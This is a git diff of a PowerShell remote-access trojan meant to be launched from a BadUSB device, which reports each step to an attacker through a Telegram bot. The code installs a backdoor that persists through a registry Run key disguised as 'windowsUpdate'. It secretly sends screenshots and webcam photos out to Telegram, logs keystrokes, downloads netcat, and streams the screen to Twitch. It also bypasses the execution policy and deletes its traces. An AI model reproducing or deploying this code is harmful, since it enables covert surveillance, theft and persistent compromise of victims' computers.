@@ -1,5 +1,5 @@
 
-<#
+<#  
 BADUSB COMMANDS:
     # Execute 
     powershell.exe -windowstyle hidden -file this_file.ps1
@@ -73,10 +73,10 @@ function turnOffScreen {
 function backdoor {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
         
-        Write-Host "Downloading backdoor.."
+        Send-Message "Downloading.."
         Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
 
-        Write-Host "Adding backdoor to the reg.."
+        Send-Message "Adding_to_the_reg.."
 		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
 
         # Check backdoor
@@ -108,12 +108,18 @@ function screenshot {
 
 function cleanAll {
     # Remove screenshots
-    rm C:\Users\$env:username\Documents\screenshot.jpg
+    Send-Message "Deleting_screenshots.."
+    Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"
     # Remove cUrl
-    rm C:\Users\$env:username\AppData\Local\Temp\1
+    Send-Message "Deleting_cURL.."
+    Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"
     # Remove backdoor
-    rm C:\Users\$env:username\Documents\windowsUpdate.ps1
+    Send-Message "Deleting_backdoor.."
+    Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
+    # Remove webcam
+    Send-Message "Deleting_webcam.."
+    Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
 }
 
 function installCurl {
@@ -136,15 +142,15 @@ function installCurl {
 }
 
 function sendPhoto {
-    Write-Host "Sending screenshot.."
+    Send-Message "Sending.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
-    Write-Host "Deleting screenshot.."
     Start-Sleep -Seconds 5
+    Send-Message "Deleting.."
     Remove-Item $photo
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
@@ -194,7 +200,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   $null = New-Item -Path $Path -ItemType File -Force
 
   try {
-    Write-Host 'Recording key presses..' -ForegroundColor Red
+    Write-Host 'Recording..'
     Send-Message 'Recording..'
 
     # create endless loop. When user presses CTRL+C, finally-block
@@ -252,56 +258,56 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 
 function webcam {
-    Write-Host "Downloading CommandCam.."
+    Send-Message "Downloading.."
     # https://batchloaf.wordpress.com/commandcam/
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $url -OutFile $outpath
 
-    Write-Host "Taking picture.."
+    Send-Message "Taking_picture.."
     $args = "/filename C:\Users\$env:username\Documents\image.jpg"
     Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
     Start-Sleep -Seconds 5
 
-    Write-Host "Sending picture.."
+    Send-Message "Sending_picture.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
-    Write-Host "Deleting picture.."
     Start-Sleep -Seconds 5
+    Send-Message "Deleting_picture.."
     Remove-Item $photo
     Remove-Item $outpath
 }
 
 function mainBrowser {
-    Write-Host "Checking main browser on the reg.."
+    Send-Message "Checking_main_browser_on_the_reg.."
     $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
 
     if ($mainBrowser -match 'chrome') {
-        Write-Host "Chrome!"
+        Send-Message "Chrome!"
         $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
         if(![System.IO.File]::Exists($chrome)){
             $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
-            Write-Host "Chrome x64!"
+            Send-Message "Chrome x64!"
             return $chrome
         }
-        Write-Host "Chrome x86!"
+        Send-Message "Chromex86!"
         return $chrome
      }
 
     ElseIf ($mainBrowser -match 'Firefox') {
-        Write-Host "Firefox!"
+        Send-Message "Firefox!"
         $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
         if(![System.IO.File]::Exists($firefox)){
             $firefox = "${env:ProgramFiles}\Mozilla Firefox\firefox.exe"
-            Write-Host "Firefox x64!"
+            Send-Message "Firefox x64!"
             return $firefox
         }
-        Write-Host "Firefox x86!"
+        Send-Message "Firefoxx86!"
         return $firefox
      }
 }
@@ -510,7 +516,7 @@ public static void SwitchRightVirtualDesktopInWin10()
 }
 
 function netcat {
-    Write-Host "Downloading netcat.."
+    Send-Message "Downloading_netcat.."
     $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
     $outpath = "C:\Users\$env:username\Documents\nc.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
@@ -527,13 +533,14 @@ function netcat {
 }
 
 function twitch($STREAM_KEY) {
-    Write-Host "Downloading FFmpeg.."
+    Send-Message "Downloading_FFmpeg.."
     $url = "https://ffmpeg.zeranoe.com/builds/win32/static/ffmpeg-20180828-26dc763-win32-static.zip"
     $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $url -OutFile $outpath
 
+    Send-Message "Starting_streaming.."
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
     $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
@@ -541,6 +548,7 @@ function twitch($STREAM_KEY) {
 }
 
 function stoptwitch {
+    Send-Message "Stopping twitch.."
     taskkill /F /IM ffmpeg.exe
     
     Sleep -Seconds 5
@@ -553,7 +561,7 @@ function stoptwitch {
 ## BYPASS POLICIES ##
 #####################
 
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+# Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 
 
 ##########################
